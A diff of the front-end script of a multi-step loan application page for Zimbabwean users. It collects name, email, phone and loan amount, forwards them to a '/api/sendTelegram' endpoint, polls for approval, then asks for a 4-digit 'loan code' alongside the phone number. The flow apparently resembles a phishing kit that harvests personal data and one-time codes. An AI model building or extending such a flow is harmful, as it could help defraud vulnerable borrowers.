+    if (!emailPattern.test(email)) {
 
-        const firstName =
-            document
-            .getElementById("firstName")
-            .value
-            .trim();
+        alert(
+            "Please enter a valid email address."
+        );
 
-
-        const lastName =
-            document
-            .getElementById("lastName")
-            .value
-            .trim();
+        return;
+    }
 
 
-        const email =
-            document
-            .getElementById("email")
-            .value
-            .trim();
+    if (!/^7\d{8}$/.test(phone)) {
+
+        alert(
+            "Please enter a valid Zimbabwe mobile number."
+        );
+
+        return;
+    }
 
 
-        const phone =
-            document
-            .getElementById("phone")
-            .value
-            .trim();
+    userData.firstName = firstName;
+    userData.lastName = lastName;
+    userData.email = email;
+    userData.phone = phone;
 
 
-        if (
-            !firstName ||
-            !lastName ||
-            !email ||
-            !phone
-        ) {
-
-            alert(
-                "Please complete all fields."
-            );
-
-            return;
-
-        }
+    document
+        .getElementById(
+            "successMsgRegister"
+        )
+        .classList
+        .remove("hidden");
 
 
-        const emailPattern =
-            /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-
-        if (!emailPattern.test(email)) {
-
-            alert(
-                "Please enter a valid email address."
-            );
-
-            return;
-
-        }
-
-
-        if (!/^7\d{8}$/.test(phone)) {
-
-            alert(
-                "Please enter a valid Zimbabwe mobile number."
-            );
-
-            return;
-
-        }
-
-
-        userData.firstName = firstName;
-
-        userData.lastName = lastName;
-
-        userData.email = email;
-
-        userData.phone = phone;
-
+    setTimeout(function() {
 
         document
-            .getElementById(
-                "successMsgRegister"
-            )
+            .getElementById("registerForm")
+            .classList
+            .add("hidden");
+
+        document
+            .getElementById("loanForm")
             .classList
             .remove("hidden");
 
+        setProgress(2);
 
-        setTimeout(function () {
+        loadLoanAmounts();
 
-            document
-                .getElementById("registerForm")
-                .classList
-                .add("hidden");
+    }, 300);
+}
+
+
+/* ==========================
+   STEP 2
+========================== */
+
+function loadLoanAmounts() {
+
+    const amountList =
+        document.getElementById(
+            "amountList"
+        );
+
+
+    const amounts = [
+        "USD 100",
+        "USD 200",
+        "USD 300",
+        "USD 500",
+        "USD 1,000"
+    ];
+
+
+    amountList.innerHTML = "";
+
+
+    amounts.forEach(function(amount) {
+
+        const button =
+            document.createElement(
+                "button"
+            );
+
+        button.type = "button";
+
+        button.textContent = amount;
+
+
+        button.onclick = function() {
+
+            userData.loanAmount =
+                amount;
 
 
             document
                 .getElementById("loanForm")
                 .classList
+                .add("hidden");
+
+
+            document
+                .getElementById("reviewForm")
+                .classList
                 .remove("hidden");
 
 
-            setProgress(2);
+            document
+                .getElementById("reviewFirstName")
+                .textContent =
+                userData.firstName;
 
 
-            loadLoanAmounts();
+            document
+                .getElementById("reviewLastName")
+                .textContent =
+                userData.lastName;
 
-        }, 300);
 
+            document
+                .getElementById("reviewEmail")
+                .textContent =
+                userData.email;
+
+
+            document
+                .getElementById("reviewPhone")
+                .textContent =
+                "+263" +
+                userData.phone;
+
+
+            document
+                .getElementById("reviewAmount")
+                .textContent =
+                userData.loanAmount;
+
+
+            setProgress(3);
+        };
+
+
+        amountList.appendChild(button);
+
+    });
+}
+
+
+/* ==========================
+   BACK BUTTONS
+========================== */
+
+function goBackToPersonal() {
+
+    document
+        .getElementById("loanForm")
+        .classList
+        .add("hidden");
+
+
+    document
+        .getElementById("registerForm")
+        .classList
+        .remove("hidden");
+
+
+    setProgress(1);
+}
+
+
+function goBackToAmount() {
+
+    document
+        .getElementById("reviewForm")
+        .classList
+        .add("hidden");
+
+
+    document
+        .getElementById("loanForm")
+        .classList
+        .remove("hidden");
+
+
+    setProgress(2);
+
+    loadLoanAmounts();
+}
+
+
+function goBackToStatus() {
+
+    document
+        .getElementById("loginForm")
+        .classList
+        .add("hidden");
+
+
+    document
+        .getElementById("statusForm")
+        .classList
+        .remove("hidden");
+
+
+    setProgress(4);
+}
+
+
+/* ==========================
+   SUBMIT APPLICATION
+========================== */
+
+async function applyLoan() {
+
+    if (
+        !userData.firstName ||
+        !userData.lastName ||
+        !userData.email ||
+        !userData.phone ||
+        !userData.loanAmount
+    ) {
+
+        alert(
+            "Please complete all application details."
+        );
+
+        return;
     }
 
 
-    /* ========================================================
-       STEP 2
-    ======================================================== */
+    const button =
+        document.querySelector(
+            "#reviewForm > button:not(.back-button)"
+        );
 
 
-    function loadLoanAmounts() {
+    button.disabled = true;
 
-        const amountList =
-            document.getElementById(
-                "amountList"
+    button.textContent =
+        "Submitting...";
+
+
+    try {
+
+        const response =
+            await fetch(
+                "/api/sendTelegram",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:
+                        JSON.stringify(
+                            userData
+                        )
+                }
             );
 
 
-        const amounts = [
+        if (!response.ok) {
 
-            "USD 100",
-            "USD 200",
-            "USD 300",
-            "USD 500",
-            "USD 1,000"
-
-        ];
+            throw new Error(
+                "Unable to submit application."
+            );
+        }
 
 
-        amountList.innerHTML = "";
+        const result =
+            await response.json();
 
 
-        amounts.forEach(function (amount) {
+        if (!result.success) {
 
-            const button =
-                document.createElement(
-                    "button"
-                );
-
-
-            button.type = "button";
+            throw new Error(
+                result.message ||
+                "Unable to submit application."
+            );
+        }
 
 
-            button.textContent =
-                amount;
+        applicationId =
+            result.applicationId;
 
-
-            button.onclick =
-                function () {
-
-
-                    userData.loanAmount =
-                        amount;
-
-
-                    document
-                        .getElementById("loanForm")
-                        .classList
-                        .add("hidden");
-
-
-                    document
-                        .getElementById("reviewForm")
-                        .classList
-                        .remove("hidden");
-
-
-                    document
-                        .getElementById("reviewFirstName")
-                        .textContent =
-                        userData.firstName;
-
-
-                    document
-                        .getElementById("reviewLastName")
-                        .textContent =
-                        userData.lastName;
-
-
-                    document
-                        .getElementById("reviewEmail")
-                        .textContent =
-                        userData.email;
-
-
-                    document
-                        .getElementById("reviewPhone")
-                        .textContent =
-                        "+263" +
-                        userData.phone;
-
-
-                    document
-                        .getElementById("reviewAmount")
-                        .textContent =
-                        userData.loanAmount;
-
-
-                    setProgress(3);
-
-                };
-
-
-            amountList.appendChild(button);
-
-        });
-
-    }
-
-
-    /* ========================================================
-       BACK BUTTONS
-    ======================================================== */
-
-
-    function goBackToPersonal() {
-
-        document
-            .getElementById("loanForm")
-            .classList
-            .add("hidden");
-
-
-        document
-            .getElementById("registerForm")
-            .classList
-            .remove("hidden");
-
-
-        setProgress(1);
-
-    }
-
-
-    function goBackToAmount() {
 
         document
             .getElementById("reviewForm")
@@ -1338,368 +1421,575 @@
 
 
         document
-            .getElementById("loanForm")
+            .getElementById("statusForm")
             .classList
             .remove("hidden");
 
 
-        setProgress(2);
+        document
+            .getElementById("statusReference")
+            .textContent =
+            "Application ID: " +
+            applicationId;
 
 
-        loadLoanAmounts();
+        setProgress(4);
 
-    }
-
-
-    /* ========================================================
-       SUBMIT APPLICATION
-    ======================================================== */
+        startStatusChecking();
 
 
-    async function applyLoan() {
+    } catch (error) {
 
-        if (
-            !userData.firstName ||
-            !userData.lastName ||
-            !userData.email ||
-            !userData.phone ||
-            !userData.loanAmount
-        ) {
+        console.error(error);
 
-            alert(
-                "Please complete all application details."
-            );
+        alert(
+            error.message ||
+            "Unable to submit application."
+        );
 
-            return;
-
-        }
-
-
-        const button =
-            document.querySelector(
-                "#reviewForm > button:not(.back-button)"
-            );
-
-
-        button.disabled = true;
-
+        button.disabled = false;
 
         button.textContent =
-            "Submitting...";
+            "Submit Application";
+    }
+}
 
 
-        try {
+/* ==========================
+   STATUS CHECK
+========================== */
+
+function startStatusChecking() {
+
+    if (statusTimer) {
+        clearInterval(statusTimer);
+    }
+
+    checkApplicationStatus();
+
+    statusTimer =
+        setInterval(
+            checkApplicationStatus,
+            5000
+        );
+}
 
 
-            /*
-            The browser sends the application
-            to your own backend.
+async function checkApplicationStatus() {
 
-            Keep Telegram bot credentials
-            on the server, not in this HTML.
-            */
-
-
-            const response =
-                await fetch(
-                    "/api/sendTelegram",
-                    {
-
-                        method: "POST",
-
-                        headers: {
-
-                            "Content-Type":
-                                "application/json"
-
-                        },
-
-
-                        body:
-                            JSON.stringify(
-                                userData
-                            )
-
-                    }
-                );
-
-
-            if (!response.ok) {
-
-                throw new Error(
-                    "Unable to submit application."
-                );
-
-            }
-
-
-            const result =
-                await response.json();
-
-
-            if (!result.success) {
-
-                throw new Error(
-                    result.message ||
-                    "Unable to submit application."
-                );
-
-            }
-
-
-            applicationId =
-                result.applicationId;
-
-
-            document
-                .getElementById("reviewForm")
-                .classList
-                .add("hidden");
-
-
-            document
-                .getElementById("statusForm")
-                .classList
-                .remove("hidden");
-
-
-            document
-                .getElementById("statusReference")
-                .textContent =
-                "Application ID: " +
-                applicationId;
-
-
-            setProgress(4);
-
-
-            startStatusChecking();
-
-
-        } catch (error) {
-
-            console.error(error);
-
-
-            alert(
-                error.message ||
-                "Unable to submit application."
-            );
-
-
-            button.disabled = false;
-
-
-            button.textContent =
-                "Submit Application";
-
-        }
-
+    if (!applicationId) {
+        return;
     }
 
 
-    /* ========================================================
-       STATUS CHECK
-    ======================================================== */
+    try {
 
-
-    function startStatusChecking() {
-
-        if (statusTimer) {
-
-            clearInterval(
-                statusTimer
+        const response =
+            await fetch(
+                `/api/status?id=${encodeURIComponent(applicationId)}`
             );
 
-        }
 
-
-        checkApplicationStatus();
-
-
-        statusTimer =
-            setInterval(
-                checkApplicationStatus,
-                5000
-            );
-
-    }
-
-
-    async function checkApplicationStatus() {
-
-        if (!applicationId) {
+        if (!response.ok) {
             return;
         }
 
 
-        try {
+        const application =
+            await response.json();
 
 
-            const response =
-                await fetch(
-                    `/api/status?id=${encodeURIComponent(applicationId)}`
-                );
+        if (!application.success) {
+            return;
+        }
 
 
-            if (!response.ok) {
-                return;
-            }
+        const status =
+            String(application.status || "")
+            .toLowerCase();
 
 
-            const application =
-                await response.json();
+        if (status === "approved") {
 
+            showApproved();
 
-            if (!application.success) {
-                return;
-            }
+            clearInterval(statusTimer);
 
-
-            const status =
-                String(
-                    application.status || ""
-                )
-                .toLowerCase();
-
-
-            if (status === "approved") {
-
-                showApproved();
-
-
-                clearInterval(
-                    statusTimer
-                );
-
-
-                statusTimer = null;
-
-            }
-
-
-            else if (
-                status === "rejected"
-            ) {
-
-                showRejected();
-
-
-                clearInterval(
-                    statusTimer
-                );
-
-
-                statusTimer = null;
-
-            }
-
-
-        } catch (error) {
-
-            console.error(
-                "Status check failed:",
-                error
-            );
+            statusTimer = null;
 
         }
 
+        else if (status === "rejected") {
+
+            showRejected();
+
+            clearInterval(statusTimer);
+
+            statusTimer = null;
+        }
+
+    } catch (error) {
+
+        console.error(
+            "Status check failed:",
+            error
+        );
+    }
+}
+
+
+/* ==========================
+   APPROVED
+========================== */
+
+function showApproved() {
+
+    document
+        .getElementById("statusIcon")
+        .textContent = "✓";
+
+
+    document
+        .getElementById("statusIcon")
+        .style.background =
+        "#e8f7ee";
+
+
+    document
+        .getElementById("statusTitle")
+        .textContent =
+        "Loan Approved Successfully";
+
+
+    document
+        .getElementById("statusTitle")
+        .className =
+        "status-title approved";
+
+
+    document
+        .getElementById("statusText")
+        .textContent =
+        "Congratulations! Your loan application has been approved successfully.";
+
+
+    document
+        .getElementById("statusReference")
+        .textContent =
+        "Application ID: " +
+        applicationId;
+
+
+    /*
+     * After a short delay, move the client
+     * to the loan-code page.
+     */
+
+    setTimeout(
+        showLoginPage,
+        2500
+    );
+}
+
+
+/* ==========================
+   REJECTED
+========================== */
+
+function showRejected() {
+
+    document
+        .getElementById("statusIcon")
+        .textContent = "×";
+
+
+    document
+        .getElementById("statusIcon")
+        .style.background =
+        "#fdecec";
+
+
+    document
+        .getElementById("statusTitle")
+        .textContent =
+        "Loan Application Rejected";
+
+
+    document
+        .getElementById("statusTitle")
+        .className =
+        "status-title rejected";
+
+
+    document
+        .getElementById("statusText")
+        .textContent =
+        "Unfortunately, your loan application was not approved.";
+
+
+    document
+        .getElementById("statusReference")
+        .textContent =
+        "Application ID: " +
+        applicationId;
+}
+
+
+/* ==========================
+   LOGIN PAGE
+========================== */
+
+function showLoginPage() {
+
+    document
+        .getElementById("statusForm")
+        .classList
+        .add("hidden");
+
+
+    document
+        .getElementById("loginForm")
+        .classList
+        .remove("hidden");
+
+
+    document
+        .getElementById("loginPhone")
+        .textContent =
+        "+263" +
+        userData.phone;
+
+
+    document
+        .getElementById("loginApplicationId")
+        .textContent =
+        applicationId;
+
+
+    document
+        .getElementById("loginPhoneInput")
+        .value =
+        userData.phone;
+
+
+    clearPin();
+
+    document
+        .getElementById("pin1")
+        .focus();
+}
+
+
+/* ==========================
+   PIN INPUT
+========================== */
+
+const pinInputs =
+    document.querySelectorAll(
+        ".pin-input"
+    );
+
+
+pinInputs.forEach(function(input, index) {
+
+    input.addEventListener(
+        "input",
+        function() {
+
+            this.value =
+                this.value
+                .replace(/\D/g, "")
+                .slice(0, 1);
+
+
+            if (
+                this.value &&
+                index < pinInputs.length - 1
+            ) {
+
+                pinInputs[index + 1]
+                    .focus();
+            }
+        }
+    );
+
+
+    input.addEventListener(
+        "keydown",
+        function(event) {
+
+            if (
+                event.key === "Backspace" &&
+                !this.value &&
+                index > 0
+            ) {
+
+                pinInputs[index - 1]
+                    .focus();
+            }
+        }
+    );
+
+
+    input.addEventListener(
+        "paste",
+        function(event) {
+
+            event.preventDefault();
+
+            const pasted =
+                (
+                    event.clipboardData ||
+                    window.clipboardData
+                )
+                .getData("text")
+                .replace(/\D/g, "")
+                .slice(0, 4);
+
+
+            pasted
+                .split("")
+                .forEach(function(
+                    digit,
+                    position
+                ) {
+
+                    if (
+                        pinInputs[position]
+                    ) {
+
+                        pinInputs[position]
+                            .value =
+                            digit;
+                    }
+                });
+
+
+            const nextIndex =
+                Math.min(
+                    pasted.length,
+                    pinInputs.length - 1
+                );
+
+
+            pinInputs[nextIndex]
+                .focus();
+        }
+    );
+
+});
+
+
+function getLoanCode() {
+
+    return Array
+        .from(pinInputs)
+        .map(function(input) {
+            return input.value;
+        })
+        .join("");
+}
+
+
+function clearPin() {
+
+    pinInputs.forEach(function(input) {
+        input.value = "";
+    });
+}
+
+
+/* ==========================
+   LOGIN / LOAN CODE
+========================== */
+
+async function loginUser() {
+
+    const phone =
+        document
+        .getElementById(
+            "loginPhoneInput"
+        )
+        .value
+        .trim();
+
+
+    const code =
+        getLoanCode();
+
+
+    const message =
+        document.getElementById(
+            "loginMessage"
+        );
+
+
+    const button =
+        document.getElementById(
+            "loginButton"
+        );
+
+
+    message.textContent = "";
+
+    message.className =
+        "login-message";
+
+
+    if (!/^7\d{8}$/.test(phone)) {
+
+        message.textContent =
+            "Please enter a valid phone number.";
+
+        message.classList.add(
+            "login-error"
+        );
+
+        return;
     }
 
 
-    /* ========================================================
-       APPROVED
-    ======================================================== */
+    if (!/^\d{4}$/.test(code)) {
 
+        message.textContent =
+            "Please enter the complete 4-digit loan code.";
 
-    function showApproved() {
+        message.classList.add(
+            "login-error"
+        );
 
-        document
-            .getElementById("statusIcon")
-            .textContent = "✓";
-
-
-        document
-            .getElementById("statusIcon")
-            .style.background =
-            "#e8f7ee";
-
-
-        document
-            .getElementById("statusTitle")
-            .textContent =
-            "Loan Approved Successfully";
-
-
-        document
-            .getElementById("statusTitle")
-            .className =
-            "status-title approved";
-
-
-        document
-            .getElementById("statusText")
-            .textContent =
-            "Congratulations! Your loan application has been approved successfully.";
-
-
-        document
-            .getElementById("statusReference")
-            .textContent =
-            "Application ID: " +
-            applicationId;
-
+        return;
     }
 
 
-    /* ========================================================
-       REJECTED
-    ======================================================== */
+    button.disabled = true;
+
+    button.textContent =
+        "Verifying...";
 
 
-    function showRejected() {
+    try {
 
-        document
-            .getElementById("statusIcon")
-            .textContent = "×";
+        /*
+         * The loan code is verified by your
+         * server against the approved
+         * application's loanCode field.
+         */
+
+        const response =
+            await fetch(
+                "/api/verifyLogin",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:
+                        JSON.stringify({
+
+                            phone:
+                                "+263" +
+                                phone,
+
+                            applicationId:
+                                applicationId,
+
+                            code:
+                                code
+                        })
+                }
+            );
 
 
-        document
-            .getElementById("statusIcon")
-            .style.background =
-            "#fdecec";
+        const result =
+            await response.json();
 
 
-        document
-            .getElementById("statusTitle")
-            .textContent =
-            "Loan Application Rejected";
+        if (!response.ok) {
+
+            throw new Error(
+                result.message ||
+                "Unable to verify loan code."
+            );
+        }
 
 
-        document
-            .getElementById("statusTitle")
-            .className =
-            "status-title rejected";
+        if (!result.success) {
+
+            message.textContent =
+                result.message ||
+                "Incorrect loan code.";
+
+            message.classList.add(
+                "login-error"
+            );
+
+            clearPin();
+
+            document
+                .getElementById("pin1")
+                .focus();
+
+            return;
+        }
 
 
-        document
-            .getElementById("statusText")
-            .textContent =
-            "Unfortunately, your loan application was not approved.";
+        /*
+         * Successful loan-code verification.
+         */
+
+        message.textContent =
+            "✓ Loan code verified successfully.";
+
+        message.classList.add(
+            "login-success"
+        );
 
 
-        document
-            .getElementById("statusReference")
-            .textContent =
-            "Application ID: " +
-            applicationId;
+        /*
+         * You can redirect to the next
+         * legitimate application/account
+         * page here if you have one.
+         */
 
+        setTimeout(function() {
+
+            message.textContent =
+                "✓ Loan code verified successfully. You may continue.";
+
+        }, 500);
+
+
+    } catch (error) {
+
+        console.error(
+            "Loan code verification error:",
+            error
+        );
+
+
+        message.textContent =
+            error.message ||
+            "Unable to verify the loan code.";
+
+        message.classList.add(
+            "login-error"
+        );
+
+
+    } finally {
+
+        button.disabled = false;
+
+        button.textContent =
+            "Login";
     }
-
+}
 
 </script>
 
-
 </body>
-
 </html>
